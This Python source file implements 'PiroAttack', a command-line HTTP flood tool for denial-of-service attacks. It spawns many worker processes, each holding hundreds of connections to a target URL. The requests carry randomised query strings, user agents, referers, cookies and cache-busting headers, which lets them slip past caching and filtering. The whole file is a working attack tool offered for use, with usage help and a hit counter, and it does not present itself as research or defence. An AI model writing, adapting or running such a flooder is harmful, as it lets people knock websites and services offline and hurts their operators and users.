import rich
from rich.console import Console
from rich.table import Table
from multiprocessing import Process, Manager, Pool
import urllib.parse, ssl
import sys, getopt, random, time, os  
import http.client

def read_resource(path):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, path)
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
            return data.decode() if data else ""
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return ""
           
def read_version():
    return read_resource(".version").strip()
    
VERSION = read_version()
console = Console()  
PIROATTACK_BANNER = f"[bold red]PiroAttack[/bold red] [bold yellow]{VERSION}[/bold yellow] [bold cyan]by[/bold cyan] [bold green]Piro Developer[/bold green] <[bold blue]github.com/hk4crprasad[/bold blue]>"

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}
HTTPCLIENT = http.client
DEBUG = False
SSLVERIFY = True
METHOD_GET = 'get'
METHOD_POST = 'post'   
METHOD_RAND = 'random'
JOIN_TIMEOUT = 1.0  
DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500
  
class PiroAttack:

    def __init__(self, url):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))   
        self.workersQueue = []
        self.useragents = []
        self.nr_workers = DEFAULT_WORKERS
        self.nr_sockets = DEFAULT_SOCKETS
        self.method = METHOD_GET

    def print_header(self):
        console.print(PIROATTACK_BANNER)
        console.print()

    def print_stats(self):
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Successful Hits", style="dim", width=12)  
        table.add_column("Failed Hits", style="dim", width=12)
        table.add_row(str(self.counter[0]), str(self.counter[1]))
        console.print(table)
    
    def fire(self):

        self.print_header()
        console.print("Hitting webserver in mode '[bold]{0}[/bold]' with [bold]{1}[/bold] workers running [bold]{2}[/bold] connections each. Hit [red]CTRL+C[/red] to cancel.".format(self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print("Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):

            try:

                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except Exception:
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print("Initiating monitor")
        self.monitor()

    def start(self):
        self.print_header()
        
        console.print(f"[bold yellow]Hitting webserver using {self.method} method with {self.nr_workers} workers, each running {self.nr_sockets} connections. Press Ctrl+C to exit.[/bold yellow]\n")
    
        for i in range(int(self.nr_workers)):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method
                self.workersQueue.append(worker)
                worker.start()
            except:  
                console.print(f"[bold red]Failed to start worker {i}[/bold red]")   

        self.monitor()

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)  
                    else:
                        self.workersQueue.remove(worker)
                        
                self.print_stats()
                    
            except (KeyboardInterrupt, SystemExit): 
                console.print("[bold red]CTRL+C detected. Exiting...[/bold red]")
                
                for worker in self.workersQueue:
                    try:
                        worker.stop()
                    except:
                        pass
                        
                break

    def stop(self):
        for worker in self.workersQueue:
            try:
                worker.stop()  
            except:
                pass
        
class Striker(Process):
    runnable = True
    def __init__(self, url, nr_sockets, counter):
        super().__init__()
        self.counter = counter
        self.nr_socks = nr_sockets
        parsedUrl = urllib.parse.urlparse(url)
        self.ssl = parsedUrl.scheme == 'https' 
        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path  
        self.port = parsedUrl.port or (443 if self.ssl else 80)
        self.referers = [   
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'  
        ]
        self.socks = []
        
    def buildblock(self, size):
        out_str = ''  
        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90)) 
        _NUMERIC   = list(range(48, 57))
        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC 
        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str

    def run(self):
        
        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        if SSLVERIFY:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)  
                        else:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())   
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(c)
                for conn_req in self.socks:  
                    (url, headers) = self.createPayload()  
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    conn_req.request(method.upper(), url, None, headers)   
                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.incCounter()
                self.closeConnections()
            except:
                self.incFailed()

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass

    def createPayload(self):  
        req_url, headers = self.generateData() 
        random_keys = list(headers.keys())
        random.shuffle(random_keys)   
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount=1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = f"{key}={value}"
            queryString.append(element)

        return '&'.join(queryString)

    def generateData(self): 
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)  
        http_headers = self.generateRandomHeaders()
        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner='?'): 
        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def getUserAgent(self):
        if self.useragents:
            return random.choice(self.useragents)

        mozilla_version = "Mozilla/5.0"
        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
        os_name = random.choice(os['name']) 
        sysinfo = os_name
        
        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]

        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']
            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:  
                browser_string = f"{random.choice(browser['ext_pre'])}; {browser_string}"

            sysinfo = f"{browser_string}; {sysinfo}"

            if 'ext_post' in browser:
                sysinfo = f"{sysinfo}; {random.choice(browser['ext_post'])}"


        if 'ext' in os and os['ext']:
            sysinfo = f"{sysinfo}; {random.choice(os['ext'])}"

        ua_string = f"{mozilla_version} ({sysinfo})" 

        if 'name' in platform and platform['name']:
            ua_string = f"{ua_string} {random.choice(platform['name'])}"

        if 'details' in platform and platform['details']:
            details = platform['details']
            ua_string = f"{ua_string} ({random.choice(details) if len(details) > 1 else details[0]})" 

        if 'extensions' in platform and platform['extensions']:
            ua_string = f"{ua_string} {random.choice(platform['extensions'])}"

        return ua_string

    def generateRandomHeaders(self):
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)  
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])
        acceptEncoding = ['', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(acceptEncoding) 
        nrEncodings = random.randint(1, int(len(acceptEncoding)/2))
        roundEncodings = acceptEncoding[:nrEncodings]  

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1,1000), 
            'Host': self.host,  
        }

        if random.randrange(2) == 0: 
            acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15'] 
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = f'{acceptCharset[0]},{acceptCharset[1]};q={round(random.random(), 1)},*;q={round(random.random(), 1)}'

        if random.randrange(2) == 0:
            url_part = self.buildblock(random.randint(5,10))  
            random_referer = random.choice(self.referers) + url_part
            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer
            
        if random.randrange(2) == 0: 
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    def stop(self): 
        self.runnable = False
        self.closeConnections() 
        self.terminate()
        
    def incCounter(self):
        try:
            self.counter[0] += 1
        except:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1 
        except:
            pass
        
def main():

    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-n", "--nosslcheck"):
                global SSLVERIFY
                SSLVERIFY = False
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")


        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                error("cannot read file {0}".format(uas_file))

        piroattack = PiroAttack(url)
        piroattack.useragents = useragents
        piroattack.nr_workers = workers
        piroattack.method = method
        piroattack.nr_sockets = socks

        piroattack.fire()
    except getopt.GetoptError as err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)
        
import sys

from rich.console import Console

def usage():
    script_name = sys.argv[0]
    console.print()
    console.print('[bold magenta]-----------------------------------------------------------------------------------------------------------[/bold magenta]')
    console.print()
    console.print('[bold cyan]' + PIROATTACK_BANNER + '[/bold cyan]')
    console.print()
    console.print('[bold magenta] USAGE: {0} <url> [OPTIONS][/bold magenta]'.format(script_name))
    console.print()
    console.print('[yellow] OPTIONS:')
    console.print('\t Flag\t\t\t[italic]Description[/italic]\t\t\t\t\t\t[italic]Default[/italic]')
    console.print('\t [cyan]-u, --useragents[/cyan]\tFile with user-agents to use\t\t\t\t[italic](default: randomly generated)[/italic]')
    console.print('\t [cyan]-w, --workers[/cyan]\tNumber of concurrent workers\t\t\t\t[italic](default: {0})[/italic]'.format(DEFAULT_WORKERS))
    console.print('\t [cyan]-s, --sockets[/cyan]\tNumber of concurrent sockets\t\t\t\t[italic](default: {0})[/italic]'.format(DEFAULT_SOCKETS))
    console.print('\t [cyan]-m, --method[/cyan]\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t[italic](default: get)[/italic]')
    console.print('\t [cyan]-n, --nosslcheck[/cyan]\tDo not verify SSL Certificate\t\t\t\t[italic](default: True)[/italic]')
    console.print('\t [cyan]-d, --debug[/cyan]\tEnable Debug Mode [more verbose output]\t\t\t[italic](default: False)[/italic]')
    console.print('\t [cyan]-h, --help[/cyan]\tShows this help')
    console.print()
    console.print('[bold magenta]-----------------------------------------------------------------------------------------------------------[/bold magenta]')


def error(msg):
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)
